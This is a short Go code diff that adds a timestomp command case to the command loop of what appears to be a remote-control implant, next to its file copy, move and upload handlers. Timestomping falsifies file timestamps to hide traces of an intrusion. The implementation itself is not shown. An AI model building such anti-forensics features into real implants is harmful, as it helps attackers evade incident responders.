@@ -125,6 +125,8 @@ func main() {
 								execErr = command.CopyFile(cmdBuf)
 							case command.CMD_TYPE_FILE_MOVE:
 								execErr = command.MoveFile(cmdBuf)
+							case command.CMD_TYPE_TIMESTOMP:
+								execErr = command.TimeStomp(cmdBuf)
 							// UPLOAD_START and UPLOAD_LOOP is same
 							case command.CMD_TYPE_UPLOAD_START:
 								fallthrough
